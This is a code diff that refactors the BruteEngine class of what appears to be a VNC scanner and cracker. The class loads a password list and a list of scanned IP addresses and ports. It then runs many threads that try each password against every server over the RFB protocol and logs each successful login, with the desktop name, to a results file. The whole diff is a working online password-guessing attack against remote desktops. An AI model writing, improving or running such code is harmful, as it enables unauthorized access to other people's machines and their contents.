@@ -1095,101 +1095,100 @@ class ScanEngine:
                      (self.current, self.total, self.found))
 
 class BruteEngine:
+    def __init__(self):
+        self.results = None
+        self.passwords = None
+        self.servers = None
+        self.current_password = None
+        self.output_kill = False
 
-	def __init__(self):
-		pass
+    def init(self):
+        global lock, semaphore
+        lock = threading.Lock()
+        semaphore = threading.Semaphore(int(CONFIG['brute_threads']))
+        self.results = open(FILES['results'], 'a', 0)
+        self.passwords = list()
+        self.servers = list()
+        self.get_passwords()
+        self.get_servers()
 
-	def init(self):
-		global lock, semaphore
-		lock = threading.Lock()
-		semaphore = threading.Semaphore(int(CONFIG['brute_threads']))
-		self.results = open(FILES['results'], 'a', 0)
-		self.passwords = list()
-		self.servers = list()
-		self.current_password = None
-		self.output_kill = False
-		self.get_passwords()
-		self.get_servers()
-		
-	def Start(self):
-		self.init()
-		if self.passwords is not False:
-			if self.servers is not False:
-				output_thread = threading.Thread(target=self.output_thread, args=())
-				output_thread.daemon = True
-				output_thread.start()
-				for self.current_password in self.passwords:
-					try:
-						for server in self.servers:
-							semaphore.acquire()
-							thread = threading.Thread(target=self.brute_thread, args=( server, self.current_password ))
-							thread.daemon=True
-							thread.start()
-					except:
-						stdout.flush()
-						stdout.write("\n\tSome thread related error occured, try lowering the threads amount.\n")
-							
-					while threading.active_count() > 4:
-						pass
-				self.output_kill = True
+    def Start(self):
+        self.init()
+        if not self.passwords:
+            stdout.write("\n\tThere are no passwords.\n")
+            return
+        if not self.servers:
+            stdout.write("\n\tThere are no scanned ips.\n")
+            return
 
-				self.results.close()
-				stdout.write("\n\nDONE! Check \"output/results.txt\" or type \"show results\"!\n\n")
-			else:
-				stdout.write("\n\tThere are no scanned ips.\n")
-		else:
-			stdout.write("\n\tThere are no passwords.\n")
+        output_thread = threading.Thread(target=self.output_thread)
+        output_thread.daemon = True
+        output_thread.start()
+        
+        try:
+            for self.current_password in self.passwords:
+                threads = []
+                for server in self.servers:
+                    semaphore.acquire()
+                    thread = threading.Thread(target=self.brute_thread, args=(server, self.current_password))
+                    thread.daemon = True
+                    thread.start()
+                    threads.append(thread)
+                
+                for thread in threads:
+                    thread.join()
+        except Exception as e:
+            stdout.write("\n\tFailed during brute-forcing with error: {}\n".format(e))
+        finally:
+            self.output_kill = True
+            self.results.close()
+            stdout.write("\n\nDONE! Check \"output/results.txt\" or type \"show results\"!\n\n")
 
-	def brute_thread(self, server, password):
-		try:
-			rfb = RFBProtocol(server[0], password, server[1], CONFIG['brute_timeout'])
-			rfb.connect()
-			rfb.close()
-			lock.acquire()
-			if rfb.RFB:
-				if rfb.connected:
-					self.servers.pop(self.servers.index(server))
-					if rfb.null:
-						password = "null"
-					self.results.write("%s:%i-%s-[%s]\n" % (str(server[0]), int(server[1]), password, rfb.name))
-					stdout.flush()
-					stdout.write("\r[*] %s:%i - %s              \n\n" % (str(server[0]), int(server[1]), password))
-			lock.release()
-		except KeyboardInterrupt:
-			return
-		except:
-			pass
-		semaphore.release()
+    def brute_thread(self, server, password):
+        try:
+            rfb = RFBProtocol(server[0], password, server[1], CONFIG['brute_timeout'])
+            rfb.connect()
+            rfb.close()
+            if rfb.RFB and rfb.connected:
+                result_data = "%s:%i-%s-[%s]\n" % (server[0], server[1], password, rfb.name)
+                lock.acquire()
+                try:
+                    self.results.write(result_data)
+                    stdout.write("\r[*] {}:{} - {}              \n\n".format(server[0], server[1], password))
+                finally:
+                    lock.release()
+                self.servers.remove(server)
+        except Exception as e:
+            pass
+        finally:
+            semaphore.release()
 
-	def output_thread(self):
-		while not self.output_kill:
-			try:
-				if self.current_password != None:
-					stdout.flush()
-					stdout.write("\r Trying \"%s\" on %i servers    " % (self.current_password, len(self.servers)))
-					time.sleep(0.2)
-			except:
-				pass
+    def output_thread(self):
+        while not self.output_kill:
+            if self.current_password:
+                stdout.write("\r Trying \"%s\" on %i servers    " % (self.current_password, len(self.servers)))
+                time.sleep(0.2)
 
-	def get_passwords(self):
-		if not Files.file_empty(FILES['passwords']):
-			for line in open(FILES['passwords'], 'r').readlines():
-				if line.strip != "":
-					self.passwords.append(line.strip())
-		else:
-			self.passwords = False
+    def get_passwords(self):
+        try:
+            with open(FILES['passwords'], 'r') as file:
+                self.passwords = [line.strip() for line in file.readlines() if line.strip()]
+        except IOError:
+            self.passwords = False
 
-	def get_servers(self):
-		if not Files.file_empty(FILES['ips']):
-			for line in open(FILES['ips'], 'r').readlines():
-				if line.count(":") == 1:
-					line = line.strip().split(":")
-					if NetTools.is_ip(line[0]) and Misc.is_int(line[1]):
-						self.servers.append([line[0], int(line[1])])
-				elif NetTools.is_ip(line.strip()):
-					self.servers.append([line.strip(), CONFIG['scan_port']])
-		else:
-			self.servers = False
+    def get_servers(self):
+        try:
+            with open(FILES['ips'], 'r') as file:
+                self.servers = []
+                for line in file.readlines():
+                    if ":" in line:
+                        parts = line.strip().split(":")
+                        if NetTools.is_ip(parts[0]) and Misc.is_int(parts[1]):
+                            self.servers.append([parts[0], int(parts[1])])
+                    elif NetTools.is_ip(line.strip()):
+                        self.servers.append([line.strip(), CONFIG['scan_port']])
+        except IOError:
+            self.servers = False
 
 class MainEngine:
 	
